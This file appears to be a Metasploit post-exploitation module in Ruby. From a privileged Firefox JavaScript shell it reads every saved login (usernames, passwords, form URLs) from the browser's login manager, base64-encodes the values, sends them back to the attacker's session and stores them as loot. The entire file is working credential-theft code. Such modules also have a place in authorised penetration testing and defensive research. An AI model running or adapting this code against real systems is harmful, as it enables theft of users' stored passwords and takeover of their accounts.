##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'json'

class MetasploitModule < Msf::Post
  include Msf::Payload::Firefox
  include Msf::Exploit::Remote::FirefoxPrivilegeEscalation

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Firefox Gather Passwords from Privileged JavaScript Shell',
        'Description' => %q{
          This module allows collection of passwords from a Firefox Privileged JavaScript Shell.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'joev' ],
        'DisclosureDate' => '2014-04-11',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )

    register_options([
      OptInt.new('TIMEOUT', [true, 'Maximum time (seconds) to wait for a response', 90])
    ])
  end

  def run
    results = js_exec(js_payload)
    if results.present?
      begin
        passwords = JSON.parse(results)
        passwords.each do |entry|
          entry.each_key { |k| entry[k] = Rex::Text.decode_base64(entry[k]) }
        end

        if !passwords.empty?
          file = store_loot('firefox.passwords.json', 'text/json', rhost, passwords.to_json)
          print_good("Saved #{passwords.length} passwords to #{file}")
        else
          print_warning('No passwords were found in Firefox.')
        end
      rescue JSON::ParserError
        print_warning(results)
      end
    end
  end

  def js_payload
    %|
      (function(send){
        try {
          var manager = Components
                          .classes["@mozilla.org/login-manager;1"]
                          .getService(Components.interfaces.nsILoginManager);
          var logins = manager.getAllLogins();
          var passwords = [];
          var b64 = Components.utils.import("resource://gre/modules/Services.jsm").btoa;
          var fields = ['password', 'passwordField', 'username', 'usernameField',
                        'httpRealm', 'formSubmitURL', 'hostname'];

          var sanitize = function(passwdObj) {
            var sanitized = { };
            for (var i in fields) {
              sanitized[fields[i]] = b64(passwdObj[fields[i]]);
            }
            return sanitized;
          }

          // Find user from returned array of nsILoginInfo objects
          for (var i = 0; i < logins.length; i++) {
            passwords.push(sanitize(logins[i]));
          }

          send(JSON.stringify(passwords));
        } catch (e) {
          send(e);
        }
      })(this.send);
    |.strip
  end
end
